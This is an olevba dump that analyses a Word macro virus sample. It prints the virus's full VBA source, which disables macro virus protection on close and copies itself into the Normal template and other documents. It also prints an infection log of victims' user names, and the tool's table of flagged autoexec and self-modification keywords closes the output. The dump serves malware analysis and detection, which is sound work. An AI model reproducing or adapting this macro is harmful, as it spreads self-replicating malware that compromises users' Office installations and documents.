olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-027f6cc42a5e4bdf9de06f166dc4dc7180ae2484
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-027f6cc42a5e4bdf9de06f166dc4dc7180ae2484 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
On Error Resume Next
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
Options.SaveNormalPrompt = 0
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
Options.ConfirmConversions = 0
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
Application.EnableCancelKey = 0
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
Options.VirusProtection = 0
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
FP72 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
AL60 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
If FP72 > 0 And AL60 > 0 Then GoTo RA52
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
If FP72 = 0 Then
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
Set TC3 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
UP39 = True
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
End If
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
If AL60 = 0 Then
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
Set TC3 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
FP72 = FP72 + 2
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
LQ83 = True
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
End If
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
If LQ83 <> True And UP39 <> True Then GoTo RA52
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
If LQ83 = True Then TC3.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FP72 - 1))
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
If UP39 = True Then TC3.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AL60 - 1))
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
With TC3.CodeModule
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
For x = 2 To (TC3.CodeModule.CountOfLines - 1) Step 2
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
Next x
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
End With
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
RA52:
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
If AL60 <> 0 And FP72 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** PAPI  RIQUI was infected 08/12/1998 10:43:31 AM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Alfredo was infected 20/01/1999 00:39:09
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** HMHGHHH was infected 21/01/1999 05:07:41 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** computronic was infected 04/01/1980 04:32:27 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Pepito was infected 02/02/99 04:05:07 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** ELMER ARONI was infected 08/02/99 03:58:52 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** ELMER ARONI was infected 11/02/99 07:55:07 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** MONICA was infected 03/09/2030 10:04:46 AM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** MICKY was infected 13/02/99 01:01:08 a.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Hiteck PC was infected 8/03/99 3:33:37 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Luis A was infected 9/03/99 2:25:53 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 17/03/99 10:04:44 AM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 1/03/99 7:16:46 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** SAUL was infected 29/03/99 11:44:39 a.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 29/03/1999 04:19:05 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** a20211 was infected 05/04/99 11:50:08 a.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** a20212 was infected 08/04/99 08:35:40 a.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** A10218 was infected 09/04/99 04:28:38 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** TELEMATIC was infected 12/04/99 09:41:58 a.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** TELEMATIC was infected 12/04/99 02:08:34 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** TELEMATIC was infected 12/04/99 03:18:14 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** TELEMATIC was infected 19/04/99 12:11:30 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** TELEMATIC was infected 21/04/99 02:18:56 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 26/04/1999 02:55:49 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 26/04/99 06:17:07 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** alita was infected 27/04/99 03:57:46 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** TELEMATIC was infected 28/04/99 11:05:41 a.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 28/04/1999 03:15:50 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** TELEMATIC was infected 28/04/99 05:00:03 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** TELEMATIC was infected 28/04/99 05:28:07 p.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 08/05/99 10:24:42 a.m.
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 10/05/1999 10:24:27 AM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 30/06/1999 10:43:18 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Telematic was infected 22/07/1999 04:55:18 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** ADMISION was infected 26/07/1999 04:35:23 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** SSI was infected 10/08/99 4:56:21 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** SSI was infected 27/08/99 1:23:27 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** SSI was infected 4/11/99 2:24:55 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Luiggi Delatore was infected 09/11/1999 02:27:27 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Luz María Yamashiro Vera was infected 15/11/1999 05:47:10 PM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Luz María Yamashiro Vera was infected 16/11/1999 10:12:59 AM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Snorre Fagerland was infected 04.01.99 09:39:01
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
' ****** Tester was infected 2/26/01 11:56:12 AM
'TesterT00024101.DOC00024101.DOC2/26/01 11:56:12 AM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

